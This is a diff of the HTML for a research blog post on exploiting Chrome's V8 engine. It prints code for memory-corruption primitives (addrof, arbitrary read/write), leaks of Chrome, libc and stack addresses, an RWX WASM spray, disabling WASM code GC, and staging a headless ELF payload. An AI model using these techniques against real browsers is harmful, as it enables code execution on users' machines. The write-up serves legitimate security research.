-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>d8<span style="color:#ff79c6">&gt;</span> a <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Uint8Array(<span style="color:#bd93f9">8</span>)
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>d8<span style="color:#ff79c6">&gt;</span> a <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Uint8Array(<span style="color:#bd93f9">8</span>)
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>
 </span></span><span style="display:flex;"><span>d8<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">%</span>DebugPrint(a)
 </span></span><span style="display:flex;"><span>DebugPrint<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0x3fee080c5e69</span><span style="color:#ff79c6">:</span> [JSTypedArray]
@@ -875,7 +868,7 @@ The code path that should mitigate this vulnerability is the one in which the fu
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>
 </span></span><span style="display:flex;"><span>d8<span style="color:#ff79c6">&gt;</span></span></span></code></pre></div>
 The value of <code>data_ptr</code>is the result of the addition of <code>base_pointer</code> and <code>external_pointer</code> and the value of <code>external_pointer</code> is ultimately the value we want. If we apply a binary mask to negate the value of the last byte of <code>external_pointer</code>, we will retrieve the value of <code>isolate root</code>&ndash; V8&rsquo;s heap base:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> root_isolate_addr <span style="color:#ff79c6">=</span> itof(ftoi(addrof(e)) <span style="color:#ff79c6">+</span> BigInt(<span style="color:#bd93f9">5</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>));
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> root_isolate_addr <span style="color:#ff79c6">=</span> itof(ftoi(addrof(e)) <span style="color:#ff79c6">+</span> BigInt(<span style="color:#bd93f9">5</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>));
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> root_isolate <span style="color:#ff79c6">=</span> itof(ftoi(weak_read(root_isolate_addr)) <span style="color:#ff79c6">&amp;</span> <span style="color:#ff79c6">~</span>(<span style="color:#bd93f9">0xff</span>n))
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> bff <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ArrayBuffer(<span style="color:#bd93f9">8</span>)
@@ -922,7 +915,7 @@ The value of <code>data_ptr</code>is the result of the addition of <code>base_po
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span>;
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
-<!-- raw HTML omitted --></p>
+<br /></p>
 <hr>
 <h2 class="heading" id="achieving-stable-arbitrary-readwrite">
   Achieving Stable Arbitrary Read/Write
@@ -982,7 +975,7 @@ This paper will not be covering V8 Garbage Collection internals extensively as i
 </figure>
 </p>
 <p>In order to illustrate this, let&rsquo;s run the following script:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> force_gc() {
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> force_gc() {
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">var</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x80000</span>; <span style="color:#ff79c6">++</span>i) {
 </span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">var</span> a <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ArrayBuffer();
 </span></span><span style="display:flex;"><span>    }
@@ -1004,7 +997,7 @@ This paper will not be covering V8 Garbage Collection internals extensively as i
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">%</span>DebugPrint(c);
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">%</span>DebugPrint(d);</span></span></code></pre></div>
 If we see the output of this script, we will see the following:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#bd93f9">0x350808087859</span> <span style="color:#ff79c6">&lt;</span>JSArray[<span style="color:#bd93f9">1073741820</span>]<span style="color:#ff79c6">&gt;</span>
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#bd93f9">0x350808087859</span> <span style="color:#ff79c6">&lt;</span>JSArray[<span style="color:#bd93f9">1073741820</span>]<span style="color:#ff79c6">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x350808087889</span> <span style="color:#ff79c6">&lt;</span>JSArray[<span style="color:#bd93f9">3</span>]<span style="color:#ff79c6">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x3508080878e1</span> <span style="color:#ff79c6">&lt;</span>JSArray[<span style="color:#bd93f9">2</span>]<span style="color:#ff79c6">&gt;</span>
 </span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">+</span>] Forcing GC...
@@ -1019,7 +1012,7 @@ As we can notice, the addresses of all the objects have changed after the first 
 <p>Another approach is to use objects placed within <code>Large Object Space</code> region since these objects will not be garbage collected.
 I first saw this technique while reading Brendon Tiszka&rsquo;s awesome <a href="https://tiszka.com/blog/CVE_2021_21225_exploit.html">post</a>, in which he points out that if an object size exceeds the constant <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/common/globals.h;l=360;drc=64556d13a49f535430733d86bc5a6a0f36ae7d56">kMaxRegularHeapObjectSize</a> (defined as <code>1048576</code>) that object will be placed in <code>Large Object Space</code>.</p>
 <p>Following this premise, we can construct an <code>addrof</code> primitive resilient to garbage collection:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">/// constructing stable addrof
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">/// constructing stable addrof
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">let</span> lo_array_obj <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Array</span>(<span style="color:#bd93f9">1048577</span>);
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> elements_ptr <span style="color:#ff79c6">=</span> weak_read(itof(ftoi(addrof(lo_array_obj)) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>n));
 </span></span><span style="display:flex;"><span>elements_ptr <span style="color:#ff79c6">=</span> itof(ftoi(elements_ptr) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xffffffff</span>n)
@@ -1040,7 +1033,7 @@ I first saw this technique while reading Brendon Tiszka&rsquo;s awesome <a href=
 In order to create a set of stable arbitrary read/write primitives, we have to build these primitives without relying on V8 objects that will be garbage collected.</p>
 <p>In order to achiveve this, we can overwrite the <code>backing store</code> of an <code>ArrayBuffer</code> with an arbitrary unboxed pointer that is not held within the V8 heap.</p>
 <p>This limits us to use any address residing within V8&rsquo;s heap. Ironically, a neat way to gain arbitrary read/write to any arbitrary address on the V8 heap using this technique (as showcased by the exploit in Brendon&rsquo;s post) is by leveraging our previously leaked <code>root_isolate</code> as the ArrayBuffer&rsquo;s <code>backing store</code> value. This address denoting the V8 heap base won&rsquo;t change for the lifetime of the current process. Modifying the bound <code>DataView</code> object length will also enable using the V8 compressed untagged pointers as offsets:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// constructing stable read/write for v8 heap
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// constructing stable read/write for v8 heap
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">let</span> heap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ArrayBuffer(<span style="color:#bd93f9">8</span>);
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> heap_accesor <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> DataView(heap);
 </span></span><span style="display:flex;"><span>
@@ -1052,7 +1045,7 @@ In order to create a set of stable arbitrary read/write primitives, we have to b
 </span></span><span style="display:flex;"><span><span style="color:#6272a4">// overwritting Dataview length
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>weak_write(heap_accesor_length, <span style="color:#bd93f9">0xffffffff</span>);</span></span></code></pre></div>
 We will be using this technique in order to build accessors to distinct memory regions outside of V8 heap moving forward.</p>
-<!-- raw HTML omitted -->
+<br />
 <hr>
 <h2 class="heading" id="obtaining-relevant-leaks">
   Obtaining relevant leaks
@@ -1089,7 +1082,7 @@ We will be using this technique in order to build accessors to distinct memory r
   <a class="anchor" href="#leaking-chrome-base">#</a>
 </h3>
 <p>Leaking chrome&rsquo;s base is relatively simple and can be illustrated in the following code snippet:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> get_image_base(ptr) {
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> get_image_base(ptr) {
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> dword <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> centinel <span style="color:#ff79c6">=</span> ptr;
 </span></span><span style="display:flex;"><span>
@@ -1113,7 +1106,7 @@ In order to leak the base address of Chrome, we start by creating an arbitrary D
   <a class="anchor" href="#leaking-libc-base">#</a>
 </h3>
 <p>Once we have successfully retrieved the base of Chrome, we can retrieve a pointer to libc from Chrome&rsquo;s Global Offset Table (GOT), as this should be a fixed offset per Chrome patch level. After that, we can apply the same methodology as for retrieving the base address of Chrome, by scanning backward for an ELF header magic:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> libc_leak <span style="color:#ff79c6">=</span> chrome_accesor.getFloat64(kGOTOffset, <span style="color:#ff79c6">true</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> libc_leak <span style="color:#ff79c6">=</span> chrome_accesor.getFloat64(kGOTOffset, <span style="color:#ff79c6">true</span>);
 </span></span><span style="display:flex;"><span>libc_leak <span style="color:#ff79c6">=</span> itof(ftoi(libc_leak) <span style="color:#ff79c6">&amp;</span> <span style="color:#ff79c6">~</span>(<span style="color:#bd93f9">0xfff</span>n));
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> libc_base <span style="color:#ff79c6">=</span> get_image_base(ftoi(libc_leak));</span></span></code></pre></div>
 <h3 class="heading" id="leaking-the-process-stack">
@@ -1123,12 +1116,12 @@ In order to leak the base address of Chrome, we start by creating an arbitrary D
 <p>Now that we have libc&rsquo;s base address, we can retrieve the symbol <code>__environ</code> from libc as it will point to the process&rsquo; environment variables held in the stack.
 Since for this post we are writing an exploit that is dependent of Chrome version, we need to be able to resolve the address of this symbol independently of libc version.
 To do this, we can build a resolver in JavaScript leveraging our stable read primitive.</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> elf <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Elf(libc_base, libc_accesor);
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> elf <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Elf(libc_base, libc_accesor);
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> environ_addr <span style="color:#ff79c6">=</span> elf.resolve_reloc(<span style="color:#f1fa8c">&#34;__environ&#34;</span>, R_X86_64_GLOB_DAT);
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> stack_leak <span style="color:#ff79c6">=</span> libc_accesor.getBigUint64(<span style="color:#8be9fd;font-style:italic">Number</span>(environ_addr<span style="color:#ff79c6">-</span>libc_base), <span style="color:#ff79c6">true</span>)</span></span></code></pre></div>
 Ultimately, we have to retrieve the address of libc&rsquo;s  <code>DYNAMIC</code> segment to resolve various dynamic entries including the address of the relocation table held in <code>DT_RELA</code> in order to scan for relocations, the address of <code>DT_STRTAB</code> for accessing the <code>.dynstr</code> and the address of <code>DT_SYMTAB</code> for accessing symbol entries in <code>.dynsym</code>.</p>
 <p>We can then iterate the relocation table to search for the symbol we want. A snippet of the relevant code of this ELF resolver to retrieve relocation entries is shown below:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> phnum <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span>.read(<span style="color:#ff79c6">this</span>.base_addr <span style="color:#ff79c6">+</span> offsetof_phnum, <span style="color:#bd93f9">2</span>);
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> phnum <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span>.read(<span style="color:#ff79c6">this</span>.base_addr <span style="color:#ff79c6">+</span> offsetof_phnum, <span style="color:#bd93f9">2</span>);
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> phoff <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span>.read(<span style="color:#ff79c6">this</span>.base_addr <span style="color:#ff79c6">+</span> offsetof_phoff, <span style="color:#bd93f9">8</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">let</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n; i <span style="color:#ff79c6">&lt;</span> phnum; i<span style="color:#ff79c6">++</span>) {
@@ -1235,7 +1228,7 @@ Ultimately, we have to retrieve the address of libc&rsquo;s  <code>DYNAMIC</code
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
-<!-- raw HTML omitted --></p>
+<br /></p>
 <hr>
 <h2 class="heading" id="achieving-a-stable-large-rwx-region">
   Achieving a stable large RWX region
@@ -1247,7 +1240,7 @@ Ultimately, we have to retrieve the address of libc&rsquo;s  <code>DYNAMIC</code
 <p>However, as of today WASM memory pages are <code>RWX</code>, therefore that&rsquo;s what we will be using for convenience.</p>
 <p>I noticed that even if I created several WASM instances, only one <code>RWX</code> page was allocated, meaning that each Wasm instance or module does not get a dedicated <code>RWX</code> page. However, if we spray WASM modules we will eventually force v8 to enlarge our RWX region.</p>
 <p>We can do this as follows:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// forcing V8 to generate a continuous RWX memory region of 0x801000 bytes
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// forcing V8 to generate a continuous RWX memory region of 0x801000 bytes
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">let</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x10000</span>; i<span style="color:#ff79c6">++</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">new</span> WebAssembly.Instance(<span style="color:#ff79c6">new</span> WebAssembly.Module(wasm_code));
 </span></span><span style="display:flex;"><span>}
@@ -1261,13 +1254,13 @@ Ultimately, we have to retrieve the address of libc&rsquo;s  <code>DYNAMIC</code
 </span></span><span style="display:flex;"><span>wasm_instance_addr <span style="color:#ff79c6">=</span> ftoi(wasm_instance_addr) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x68</span>n <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>n;
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> rwx_page_addr <span style="color:#ff79c6">=</span> itof(heap_accesor.getBigUint64(<span style="color:#8be9fd;font-style:italic">Number</span>(wasm_instance_addr), <span style="color:#ff79c6">true</span>));</span></span></code></pre></div>
 If we check RWX regions in GDB we will see the following:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#ff79c6">&gt;</span> vmmap <span style="color:#ff79c6">-</span>x <span style="color:#ff79c6">-</span>w
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#ff79c6">&gt;</span> vmmap <span style="color:#ff79c6">-</span>x <span style="color:#ff79c6">-</span>w
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LEGEND</span>: STACK <span style="color:#ff79c6">|</span> HEAP <span style="color:#ff79c6">|</span> CODE <span style="color:#ff79c6">|</span> DATA <span style="color:#ff79c6">|</span> RWX <span style="color:#ff79c6">|</span> RODATA
 </span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x38f0a69f2000</span>     <span style="color:#bd93f9">0x38f0a71f3000</span> rwxp   <span style="color:#bd93f9">801000</span> <span style="color:#bd93f9">0</span>      [anon_38f0a69f2]
 </span></span><span style="display:flex;"><span>pwndbg<span style="color:#ff79c6">&gt;</span></span></span></code></pre></div>
 However, since we want to keep the integrity of our large RWX region, we also need to handle <a href="https://docs.google.com/document/d/14ZId5XdETWgQHJe4Jozi-aKwCwqvDLgLuokP0gnJq6Q/edit">V8&rsquo;s WASM code GC</a>.</p>
 <p>Fortunately for us, there is a flag to enable or disable this feature. This flag is <code>v8::internal::FLAG_wasm_code_gc</code>. We can see it reference under <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-engine.cc;l=1427;drc=26887614d543aaa2b9f0a7ca240a8fc631f3ede9?q=FLAG_wasm_code_gc&amp;sq=&amp;ss=chromium%2Fchromium%2Fsrc">WasmEngine::AddPotentiallyDeadCode</a>, and if enabled it will eventually trigger a GC.</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (FLAG_wasm_code_gc) {
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (FLAG_wasm_code_gc) {
 </span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// Trigger a GC if 64kB plus 10% of committed code are potentially dead.
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    size_t dead_code_limit <span style="color:#ff79c6">=</span>
 </span></span><span style="display:flex;"><span>    FLAG_stress_wasm_code_gc
@@ -1283,9 +1276,9 @@ However, since we want to keep the integrity of our large RWX region, we also ne
 </span></span><span style="display:flex;"><span>        new_potentially_dead_code_size_, dead_code_limit);
 </span></span><span style="display:flex;"><span>    TriggerGC(info<span style="color:#ff79c6">-&gt;</span>num_code_gcs_triggered);</span></span></code></pre></div>
 Thankfully for us this flag is fetched dynamically by the WasmEngine on compilation of WASM module code. Therefore, we can disable this feature on runtime by overwriting the appropiate offset in Chrome:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// disabling garbage collection of wasm code
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// disabling garbage collection of wasm code
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>chrome_accesor.setBigUint64(kWasmCodeGC, <span style="color:#bd93f9">0</span>n);</span></span></code></pre></div>
-<!-- raw HTML omitted --></p>
+<br /></p>
 <hr>
 <h2 class="heading" id="preparing-a-shelf-image">
   Preparing a SHELF image
@@ -1293,7 +1286,7 @@ Thankfully for us this flag is fetched dynamically by the WasmEngine on compilat
 </h2>
 <p>In order to prepare our SHELF executable image, first we have to create a SHELF standalone instance. If you are interested about the internals of this process, you can check our article from <a href="https://tmpout.sh/1/10/">tmp.0ut vol 1</a>.</p>
 <p>The test C code we will be deploying is the following:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">void</span>){
@@ -1363,12 +1356,12 @@ Thankfully for us this flag is fetched dynamically by the WasmEngine on compilat
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
 When we create our SHELF instance, we need to make sure to make a copy of the image before removing its Program Header Table:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc-9 donut.c -lm --static-pie -T ./static-pie.ld -o <span style="color:#8be9fd;font-style:italic">test</span>
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc-9 donut.c -lm --static-pie -T ./static-pie.ld -o <span style="color:#8be9fd;font-style:italic">test</span>
 </span></span><span style="display:flex;"><span>cp <span style="color:#8be9fd;font-style:italic">test</span> test_org
 </span></span><span style="display:flex;"><span>python strip_headers.py ./test
 </span></span><span style="display:flex;"><span>xxd -i ./test &gt;&gt; ./include/embedded.h</span></span></code></pre></div>
 We need to retrieve the <code>p_filesz</code> of the  <code>PT_LOAD</code> segment of our SHELF image. This will be the size of our javascript payload:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Entry point <span style="color:#bd93f9">0x8920</span>
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Entry point <span style="color:#bd93f9">0x8920</span>
 </span></span><span style="display:flex;"><span>There are <span style="color:#bd93f9">3</span> program headers, starting at offset <span style="color:#bd93f9">64</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Program <span style="color:#8be9fd;font-style:italic">Headers</span>:
@@ -1381,7 +1374,7 @@ We need to retrieve the <code>p_filesz</code> of the  <code>PT_LOAD</code> segme
 </span></span><span style="display:flex;"><span>  TLS            <span style="color:#bd93f9">0x00000000000c5628</span> <span style="color:#bd93f9">0x00000000000c5628</span> <span style="color:#bd93f9">0x00000000000c5628</span>
 </span></span><span style="display:flex;"><span>                 <span style="color:#bd93f9">0x0000000000000020</span> <span style="color:#bd93f9">0x0000000000000060</span>  RW     <span style="color:#bd93f9">0x8</span></span></span></code></pre></div>
 We can create a javascript file containing the output of <code>xxd -i</code>, to then format it as a valid javascript file, also overwriting the value of the payload size with the value of <code>p_filesz</code> as previously mentioned:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> G_AT_ENTRY <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x8920</span>
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> G_AT_ENTRY <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x8920</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> G_AT_PHNUM <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x3</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> phdr <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Uint8Array([
@@ -1398,11 +1391,11 @@ We can create a javascript file containing the output of <code>xxd -i</code>, to
 </span></span><span style="display:flex;"><span>]);
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> payload_len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xcb1f0</span>;</span></span></code></pre></div>
 Once we have our SHELF image ready and accessible from our exploit, we have to set our SHELF image&rsquo;s stack and delta offset of our headless ELF image. These offsets correspond to the following values:</p>
